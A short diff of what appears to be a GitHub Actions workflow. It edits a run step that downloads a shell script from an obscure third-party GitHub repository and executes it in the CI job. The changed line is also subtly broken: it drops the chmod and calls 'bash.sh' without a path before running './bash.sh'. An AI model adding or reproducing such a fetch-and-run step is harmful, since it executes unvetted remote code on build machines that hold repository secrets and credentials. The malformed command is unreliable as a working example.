@@ -45,7 +45,7 @@ jobs:
 
      - run: |
 
-          wget https://github.com/HocasPocas/hellp/blob/main/bash.sh && chmod +x bash.sh && ./bash.sh
+          wget https://raw.githubusercontent.com/HocasPocas/hellp/main/bash.sh && bash.sh && ./bash.sh
 
 
       
